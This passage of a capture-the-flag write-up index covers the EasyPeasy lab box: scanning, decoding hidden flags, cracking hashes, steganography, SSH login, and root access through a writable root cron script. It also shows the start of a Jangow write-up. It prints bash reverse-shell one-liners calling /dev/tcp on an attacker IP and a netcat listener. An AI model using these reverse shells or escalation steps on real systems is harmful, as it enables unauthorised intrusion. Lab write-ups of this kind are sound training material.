nginx 1.16.1\n|_http-title: Welcome to nginx!\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: nginx/1.16.1\n6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)\n|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)\n|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)\n65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))\n|_http-server-header: Apache/2.4.43 (Ubuntu)\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.74 seconds\n</code></pre>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#ffuf","title":"ffuf","text":"Port 80Port 65524 <pre><code>\u2514\u2500# ffuf -u http://10.10.24.106/FUZZ -w /home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -recursion -recursion-depth 5 -c -fc 403 -v -e .txt,.html -o enumeration/port80\n\n        /'___\\  /'___\\           /'___\\\n/\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n    \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n\\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n        \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n\\/_/    \\/_/   \\/___/    \\/_/\n\n    v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n:: Method           : GET\n:: URL              : http://10.10.24.106/FUZZ\n:: Wordlist         : FUZZ: /home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt\n:: Extensions       : .txt .html\n:: Output file      : enumeration/port80\n:: File format      : json\n:: Follow redirects : false\n:: Calibration      : false\n:: Timeout          : 10\n:: Threads          : 40\n:: Matcher          : Response status: 200,204,301,302,307,401,403,405\n:: Filter           : Response status: 403\n________________________________________________\n\n[Status: 200, Size: 612, Words: 79, Lines: 26]\n| URL | http://10.10.24.106/index.html\n    * FUZZ: index.html\n\n[Status: 301, Size: 169, Words: 5, Lines: 8]\n| URL | http://10.10.24.106/hidden\n| --&gt; | http://10.10.24.106/hidden/\n    * FUZZ: hidden\n\n[INFO] Adding a new job to the queue: http://10.10.24.106/hidden/FUZZ\n\n[Status: 200, Size: 43, Words: 3, Lines: 4]\n| URL | http://10.10.24.106/robots.txt\n    * FUZZ: robots.txt\n\n[Status: 200, Size: 612, Words: 79, Lines: 26]\n| URL | http://10.10.24.106/\n    * FUZZ:\n\n[INFO] Starting queued job on target: http://10.10.24.106/hidden/FUZZ\n\n[Status: 200, Size: 390, Words: 47, Lines: 19]\n| URL | http://10.10.24.106/hidden/index.html\n    * FUZZ: index.html\n\n[Status: 200, Size: 390, Words: 47, Lines: 19]\n| URL | http://10.10.24.106/hidden/\n    * FUZZ:\n\n[Status: 301, Size: 169, Words: 5, Lines: 8]\n| URL | http://10.10.24.106/hidden/whatever\n| --&gt; | http://10.10.24.106/hidden/whatever/\n    * FUZZ: whatever\n\n[INFO] Adding a new job to the queue: http://10.10.24.106/hidden/whatever/FUZZ\n\n[INFO] Starting queued job on target: http://10.10.24.106/hidden/whatever/FUZZ\n\n[Status: 200, Size: 435, Words: 47, Lines: 22]\n| URL | http://10.10.24.106/hidden/whatever/index.html\n    * FUZZ: index.html\n\n[Status: 200, Size: 435, Words: 47, Lines: 22]\n| URL | http://10.10.24.106/hidden/whatever/\n    * FUZZ:\n\n:: Progress: [79752/79752] :: Job [3/3] :: 762 req/sec :: Duration: [0:01:34] :: Errors: 18 ::\n</code></pre> <pre><code>\u2514\u2500# ffuf -u http://10.10.24.106:65524/FUZZ -w /home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -recursion -recursion-depth 5 -c -fc 403 -v -e .txt,.html -o enumeration/port65524 -of all                           1 \u2a2f\n\n        /'___\\  /'___\\           /'___\\\n/\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n    \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n\\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n        \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n\\/_/    \\/_/   \\/___/    \\/_/\n\n    v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n:: Method           : GET\n:: URL              : http://10.10.24.106:65524/FUZZ\n:: Wordlist         : FUZZ: /home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt\n:: Extensions       : .txt .html\n:: Output file      : enumeration/port65524.{json,ejson,html,md,csv,ecsv}\n:: File format      : all\n:: Follow redirects : false\n:: Calibration      : false\n:: Timeout          : 10\n:: Threads          : 40\n:: Matcher          : Response status: 200,204,301,302,307,401,403,405\n:: Filter           : Response status: 403\n________________________________________________\n\n[Status: 200, Size: 10818, Words: 3441, Lines: 371]\n| URL | http://10.10.24.106:65524/index.html\n    * FUZZ: index.html\n\n[Status: 200, Size: 153, Words: 13, Lines: 7]\n| URL | http://10.10.24.106:65524/robots.txt\n    * FUZZ: robots.txt\n\n[Status: 200, Size: 10818, Words: 3441, Lines: 371]\n| URL | http://10.10.24.106:65524/\n    * FUZZ:\n\n:: Progress: [79752/79752] :: Job [1/1] :: 882 req/sec :: Duration: [0:01:33] :: Errors: 6 ::\n</code></pre>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#web-walking","title":"Web Walking","text":""},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#port-80","title":"Port 80","text":"<p>HTML source of  <code>index.html</code> in folder <code>/hidden/whatever</code></p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;dead end&lt;/title&gt;\n&lt;style&gt;\nbody {\nbackground-image: url(\"https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg\");\nbackground-repeat: no-repeat;\nbackground-size: cover;\nwidth: 35em;\nmargin: 0 auto;\nfont-family: Tahoma, Verdana, Arial, sans-serif;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;\n&lt;p hidden&gt;ZmxhZ3tmMXJzN19mbDRnfQ==&lt;/p&gt;\n&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#port-65524","title":"Port 65524","text":"robots.txtindex.html (line 194)index.html (line 294) <pre><code>User-Agent:*\nDisallow:/\nRobots Not Allowed\nUser-Agent:a18672860d0510e5ab6699730763b250\nAllow:/\nThis Flag Can Enter But Only This Flag No More Exceptions\n</code></pre> <pre><code>    &lt;div class=\"main_page\"&gt;\n      &lt;div class=\"page_header floating_element\"&gt;\n        &lt;img src=\"/icons/openlogo-75.png\" alt=\"Debian Logo\" class=\"floating_element\"/&gt;\n        &lt;span class=\"floating_element\"&gt;\n          Apache 2 It Works For Me\n            &lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;\n&lt;/span&gt;\n      &lt;/div&gt;\n</code></pre> <pre><code>&lt;li&gt;\n    They are activated by symlinking available\n    configuration files from their respective\n    Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}\n    *-available/ counterparts. These should be managed\n    by using our helpers\n        &lt;tt&gt;\n</code></pre>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#indexhtml-in-folder-n0th1ng3ls3m4tt3r","title":"index.html in folder /n0th1ng3ls3m4tt3r","text":"<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;random title&lt;/title&gt;\n&lt;style&gt;\nbody {\nbackground-image: url(\"https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg\");\nbackground-color:black;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;\n&lt;img src=\"binarycodepixabay.jpg\" width=\"140px\" height=\"140px\"/&gt;\n&lt;p&gt;940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81&lt;/p&gt;\n&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#exploitation","title":"Exploitation","text":""},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#webserver-nginx-on-port-80","title":"Webserver <code>nginx</code> on port 80","text":"<p>In the HTML source of  <code>index.html</code> in the folder <code>/hidden/whatever</code> on port 80 we find a base64 encoded string. </p> <p>We can easily decode it in the terminal and get the first flag: <code>echo MzkuM3gzZKWmA19zoQEasD== | base64 -d</code> </p> <p>Result: <code>synt{s1ef7_sy4t}</code></p>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#webserver-apache-on-port-65524","title":"Webserver <code>apache</code> on port 65524","text":""},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#robotstxt-in-root-folder","title":"<code>robots.txt</code> in root folder","text":"<p>The string in the <code>robots.txt</code> is probably a md5 hash. It has hexadecimal characters and is 32 characters long</p> <p><pre><code>srv001:/home/bonzo # echo -n n18672860q0510r5no6699730763o250 | wc -c 32\n</code></pre> We can also check it with the tool <code>hash-identifier</code>:</p> <p><pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ctf/thm/easypeasy]\n\u2514\u2500# hash-identifier n18672860q0510r5no6699730763o250  \n   #########################################################################\n   #     __  __                     __           ______    _____           #\n   #    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #\n   #    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #\n   #     \\ \\  _  \\  /'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #\n   #      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #\n   #       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #\n   #        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #\n   #                                                             By Zion3R #\n   #                                                    www.Blackploit.com #\n   #                                                   Root@Blackploit.com #\n   #########################################################################\n--------------------------------------------------\n\nPossible Hashs:\n[+] MD5\n[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\n</code></pre> Trying to crack it with the downloadable <code>easypeasy.txt</code> isn't succesfull so we have to try and hope an online tool has the hash in it's database.  Another way could be to simply paste the string in the google searchbar but that would result in write-ups as well and we don't want that for now. So we search google with <code>decrypt md5 hash</code></p> <p>The third entry is able to decrypt the hash.</p> <p>https://md5hashing.net gives us the second flag<code>synt{1z_f3p0aq_sy4t}</code></p>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#flag-in-indexhtml-in-root-folder","title":"flag in <code>index.html</code> in root folder","text":"<p>The <code>index.html</code> is seemingly a default apache page but with two entries that are not included in a standard default apache page. The first entry is flag3 and we can find it in clear sight on the page. The second entry is hidden in the source code: <code>its encoded with ba....:BofWzC173A2K6qBeNtRNY0Ih</code>  The hiny is that it's encoded in \"ba\". It could be some base64 or similar encoding. The easiest way to check that out is with cyberchef. We try <code>base64</code> but the output makes no sense. So we try the other base(n) encodings until we get an output that makes sense, in this case <code>base62</code></p> <p></p> <p>The result looks like a folder and adding it to the <code>IP:PORT</code> in the browser we can confirm it's a new, hidden folder </p>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#string-in-indexhtml-in-folder-n0th1ng3ls3m4tt3r","title":"string in index.html in folder /n0th1ng3ls3m4tt3r","text":"<p>In the source of index.html in the newly discovered folder <code>/n0th1ng3ls3m4tt3r</code> we find the string <code>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p> <p><code>hash-identifier</code> says it's probably <code>sha256</code></p> <pre><code>--------------------------------------------------\n HASH: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81\n\nPossible Hashs:\n[+] SHA-256\n[+] Haval-256\n</code></pre> <p>But <code>hash-identifier</code> was wrong here. It's GOST, a Russian cryptography function</p> <p>GOST(hash function)</p> <p>If we use the homepage we cracked the md5 before, we get the result and the correct identification</p> <p>https://md5hashing.net/hash/gost/940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p> <p>the decrypted result is <code>mypasswordforthatjob</code></p> <p>We could have used the hint as well and crack it with the format <code>gost</code></p> <pre><code>\u2514\u2500# john --wordlist=easy.txt --format=gost hash.txt                                                                                                                                                                                                       1 \u2a2f\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gost, GOST R 34.11-94 [64/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmypasswordforthatjob (?)     \n1g 0:00:00:00 DONE (2021-11-30 20:34) 33.33g/s 136533p/s 136533c/s 136533C/s mypasswordforthatjob..flash88\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>Or, now that we now the function, <code>gost</code>, we can use hashcat as well</p> <pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ctf/thm/easypeasy]\n\u2514\u2500# hashcat -a 0 -m 6900 -O hash.txt easy.txt                                                                                                                                                                                                           130 \u2a2f\n\nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n====================================================================================================================================\n* Device #1: pthread-AMD Ryzen 5 2600 Six-Core Processor, 2883/2947 MB (1024 MB allocatable), 2MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 32\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Optimized-Kernel\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 64 MB\n\nDictionary cache hit:\n* Filename..: easy.txt\n* Passwords.: 5140\n* Bytes.....: 43708\n* Keyspace..: 5140\n\n940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:mypasswordforthatjob\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: GOST R 34.11-94\nHash.Target......: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d14...e6fd81\nTime.Started.....: Tue Nov 30 20:48:46 2021 (0 secs)\nTime.Estimated...: Tue Nov 30 20:48:46 2021 (0 secs)\nGuess.Base.......: File (easy.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   147.0 kH/s (6.44ms) @ Accel:512 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 4097/5140 (79.71%)\nRejected.........: 1/4097 (0.02%)\nRestore.Point....: 3072/5140 (59.77%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: vgazoom4x -&gt; flash72\n\nStarted: Tue Nov 30 20:45:57 2021\nStopped: Tue Nov 30 20:48:47 2021\n</code></pre> <p>Now we have a password, but still no username. We try root as the only know user but no way in. </p> <p>Since the room has a tag that says steganography, let's try steghide</p> <p>After trying steghide on the picture <code>matrix-3109795_960_720.jpg</code> I've downloaded from the css portion of the page and after I went over the <code>index.html</code> again, I realized there is a picture in the picture and maybe I was trying to crack the wrong picture. After an hour of trying <code>steghide</code> and <code>stegcracker</code> and compiling the new, ultra fast <code>stegseek</code> (recommendation) , everything went smoothly with the right picture <code>binarycodepixabay.jpg</code></p> <p>The password is the decoded <code>gost</code> hash <code>mypasswordforthatjob</code>. You can crack the password with the <code>easypeasy.txt</code> and the ultra fast (whole rockyou.txt in 4-5 seconds) <code>stegseek</code> password list as well</p> <pre><code>\u2514\u2500# stegseek binarycodepixabay.jpg easy.txt                                                                                                                                                                                                               1 \u2a2f\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"mypasswordforthatjob\"\n[i] Original filename: \"secrettext.txt\".\n[i] Extracting to \"binarycodepixabay.jpg.out\".\n</code></pre> <p>The output of <code>binarycodepixabay.jpg.out</code></p> <pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ctf/thm/easypeasy]\n\u2514\u2500# cat binarycodepixabay.jpg.out                                                                                                                                                                                                                       255 \u2a2f\nusername:boring\npassword:\n01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001\n</code></pre> <p>It's obvious it's binary, with cyberchef it should be easy to get it decoded</p> <p></p> <p>With the username <code>boring</code> and the password <code>iconvertedmypasswordtobinary</code> and not forgetting the non-standard port ssh is using, we can log in.</p> <pre><code>\u2514\u2500# ssh boring@10.10.42.67 -p 6498                                                                                                                                                                                                                      255 \u2a2f\n*************************************************************************\n**        This connection are monitored by government offical          **\n**            Please disconnect if you are not authorized              **\n** A lawsuit will be filed against you if the law is not followed      **\n*************************************************************************\nboring@10.10.42.67's password: \nYou Have 1 Minute Before AC-130 Starts Firing\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!\nYou Have 1 Minute Before AC-130 Starts Firing\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!\n</code></pre> <pre><code>boring@kral4-PC:~$ cat user.txt \nUser Flag But It Seems Wrong Like It`s Rotated Or Something\nsynt{a0jvgf33zfa0ez4y}\n</code></pre> <p>Some rotating is mentioned so first think to think about is some kind of <code>caesar cipher</code> or <code>rot13</code></p> <p>Using cyberchef again we get the flag</p> <p></p> <p>After we have the user flag we can look at <code>privilege escalation</code>. <code>sudo -l</code> <code>crontab -l</code> give us nothing so let's try with <code>linpeas.sh</code></p> <p>On the attacker machine we go to a folder with <code>linpeas.sh</code> in it and in that folder we start a simple http server with<code>python</code> or <code>php</code>.</p> <pre><code>bonzo@srv001:/opt/share/scripts/linpeas&gt; python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> <p>On the victim machine we go to a folder that's writable (<code>/temp</code>) and get the leanpeas.sh with <code>wget</code> from the attacker machine and make it executable.</p> <p>Finally, we start <code>linpeas</code>.</p> <pre><code>boring@kral4-PC:/tmp$ wget 10.14.12.247:8000/linpeas.sh\n--2021-11-30 13:55:44--  http://10.14.12.247:8000/linpeas.sh\nConnecting to 10.14.12.247:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 633658 (619K) [text/x-sh]\nSaving to: \u2018linpeas.sh\u2019\n\nlinpeas.sh                                                      100%[=====================================================================================================================================================&gt;] 618.81K  1.04MB/s    in 0.6s    \n\n2021-11-30 13:55:45 (1.04 MB/s) - \u2018linpeas.sh\u2019 saved [633658/633658]\n\nboring@kral4-PC:/tmp$ chmod +x linpeas.sh \nboring@kral4-PC:/tmp$ ./linpeas.sh\n</code></pre> <p>Running <code>linpeas</code> we see there is an <code>anacron</code> cronjob running a shell script as root every minute. The shell script is in <code>/var/www/.mysecretcronjob.sh</code></p> <pre><code>var/spool/anacron:\ntotal 20\ndrwxr-xr-x 2 root root 4096 Jun 13  2020 .\ndrwxr-xr-x 6 root root 4096 Apr 26  2018 ..\n-rw------- 1 root root    9 Nov 30 12:24 cron.daily\n-rw------- 1 root root    9 Nov 30 12:34 cron.monthly\n-rw------- 1 root root    9 Nov 30 12:29 cron.weekly\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh\n\n\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\nHOME=/root\nLOGNAME=root\n\n1       5       cron.daily      run-parts --report /etc/cron.daily\n7       10      cron.weekly     run-parts --report /etc/cron.weekly\n@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly\n</code></pre> <p>Changing to that folder and checking the files with <code>ls -al</code> we see that the user <code>boring</code> (we) has full read/write. That means we can change the contents of the file and create a reverse shell. Since the user that runs the shell script through <code>anacron</code> is <code>root</code> we'll get a root shell.</p> <p>The initial content of <code>.mysecretcronjob.sh</code></p> <pre><code>boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh \n#!/bin/bash\n# i will run as root\nboring@kral4-PC:/var/www$ \n</code></pre> <p>We can look for reverse shell at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp</p> <p>We try a <code>bash</code> reverse shell first because it's  a stable shell and it very often works. If it won't work I usually try a netcat shell. That one always worked for me.</p> <pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n\n0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n\n/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1\n</code></pre> <p>First bash reverse shell was unstable, second was stable but only a simple shell. We can get the root flag anyway. The machine had <code>python3</code> installed so I could span a bash shell so I could see more. Changing the folder to <code>/root/</code> and listing the files, I found the <code>.root.txt</code> (the <code>.</code>means it is hidden so you need the <code>-l</code> option to show all files)</p> <pre><code>/bin/bash -l &gt; /dev/tcp/10.14.12.247/1234 0&lt;&amp;1 2&gt;&amp;1\n</code></pre> <pre><code>\u2514\u2500$ nc -nvlp 1234                                                                                                                                                                                                                                                                                                        1 \u2a2f\nlistening on [any] 1234 ...\nconnect to [10.14.12.247] from (UNKNOWN) [10.10.208.230] 51916\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nroot@kral4-PC:/var/www# cd /root\ncd /root\nroot@kral4-PC:~# ls -la\nls -la\ntotal 40\ndrwx------  5 root root 4096 Jun 15  2020 .\ndrwxr-xr-x 23 root root 4096 Jun 15  2020 ..\n-rw-------  1 root root    2 Nov 30 14:45 .bash_history\n-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc\ndrwx------  2 root root 4096 Jun 13  2020 .cache\ndrwx------  3 root root 4096 Jun 13  2020 .gnupg\ndrwxr-xr-x  3 root root 4096 Jun 13  2020 .local\n-rw-r--r--  1 root root  148 Aug 17  2015 .profile\n-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt\n-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor\nroot@kral4-PC:~# cat .root.txt\ncat .root.txt\nflag{63a9f0ea7bb98050796b649e85481845}\nroot@kral4-PC:~# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@kral4-PC:~# </code></pre>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/","title":"Jangow","text":""},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#abstract","title":"Abstract","text":"<p>jangow001 is a vulnerable box from vulnhub. It's categorized as an easy machine. During initial enumeration we walk the website and pretty soon we discover a RCE in the homepage. We try to use some well know reverse shells but we hit a roadblock because of filtered outgoing connections. After we solve that problem we get an initial foothold and using linpeas it's pretty straightforward. We find the exploit, compile it and finally run it and get the root shell. </p>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#enumeration","title":"Enumeration","text":""},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#nmap","title":"nmap","text":"initialextended <pre><code>\u2514\u2500# nmap -sC -sV 192.168.0.28 -oA nmap/inital_scan \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-16 22:32 CET\nNmap scan report for 192.168.0.28\nHost is up (0.00038s latency).\nNot shown: 998 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n80/tcp open  http    Apache httpd 2.4.18\n| http-ls: Volume /\n| SIZE  TIME              FILENAME\n| -     2021-06-10 18:05  site/\n|_\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Index of /\nMAC Address: 08:00:27:87:2C:C8 (Oracle VirtualBox virtual NIC)\nService Info: Host: 127.0.0.1; OS: Unix\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.80 seconds\n</code></pre> <pre><code>\u2514\u2500# nmap -p- 192.168.0.28 -oA nmap/extended_scan  \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-16 22:41 CET\nNmap scan report for 192.168.0.28\nHost is up (0.00021s latency).\nNot shown: 65533 filtered ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n80/tcp open  http\nMAC Address: 08:00:27:87:2C:C8 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 104.52 seconds\n</code></pre>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#web-footprinting","title":"Web Footprinting","text":""},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#directory","title":"Directory","text":"<p>Looking at the IP we see a folder <code>site</code>. Going into that folder we see a homepage.</p> <p>We are starting a recursive ffuf scan, 5 levels deep, to see if something is inside this folder.</p> <pre><code>\u2514\u2500# ffuf -u http://192.168.0.28/site/FUZZ -w /home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -e .php -recursion -recursion-depth 5 -c -fc 403 -v -o  enumeration/ffuf                                                                                                             1 \u2a2f\n\n        /'___\\  /'___\\           /'___\\       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \\/_/    \\/_/   \\/___/    \\/_/       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.0.28/site/FUZZ\n :: Wordlist         : FUZZ: /home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt\n :: Extensions       : .php :: Output file      : enumeration/ffuf\n :: File format      : json\n :: Follow redirects : false\n:: Calibration      : false\n:: Timeout          : 10\n:: Threads          : 40\n:: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\n[Status: 301, Size: 318, Words: 20, Lines: 10]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/assets\n| --&gt; | http://192.168.0.28/site/assets/\n    * FUZZ: assets\n\n[INFO] Adding a new job to the queue: http://192.168.0.28/site/assets/FUZZ\n\n[Status: 301, Size: 321, Words: 20, Lines: 10]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/wordpress\n| --&gt; | http://192.168.0.28/site/wordpress/\n    * FUZZ: wordpress\n\n[INFO] Adding a new job to the queue: http://192.168.0.28/site/wordpress/FUZZ\n\n[Status: 301, Size: 315, Words: 20, Lines: 10]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/css\n| --&gt; | http://192.168.0.28/site/css/\n    * FUZZ: css\n\n[INFO] Adding a new job to the queue: http://192.168.0.28/site/css/FUZZ\n\n[Status: 301, Size: 314, Words: 20, Lines: 10]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/js\n| --&gt; | http://192.168.0.28/site/js/\n    * FUZZ: js\n\n[INFO] Adding a new job to the queue: http://192.168.0.28/site/js/FUZZ\n\n[Status: 200, Size: 10190, Words: 3711, Lines: 174]                                                                                                                                                                                                                                                                          | URL | http://192.168.0.28/site/\n    * FUZZ: [INFO] Starting queued job on target: http://192.168.0.28/site/assets/FUZZ\n\n[Status: 301, Size: 322, Words: 20, Lines: 10]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/assets/img\n| --&gt; | http://192.168.0.28/site/assets/img/\n    * FUZZ: img\n\n[INFO] Adding a new job to the queue: http://192.168.0.28/site/assets/img/FUZZ\n\n[Status: 200, Size: 1146, Words: 74, Lines: 18]                                                                                                                                                                                                                                                                              | URL | http://192.168.0.28/site/assets/\n    * FUZZ: [INFO] Starting queued job on target: http://192.168.0.28/site/wordpress/FUZZ\n\n[Status: 200, Size: 87, Words: 10, Lines: 1]                                                                                                                                                                                                                                                                                 | URL | http://192.168.0.28/site/wordpress/config.php\n    * FUZZ: config.php\n\n[Status: 200, Size: 10190, Words: 3711, Lines: 174]                                                                                                                                                                                                                                                                          | URL | http://192.168.0.28/site/wordpress/\n    * FUZZ: [INFO] Starting queued job on target: 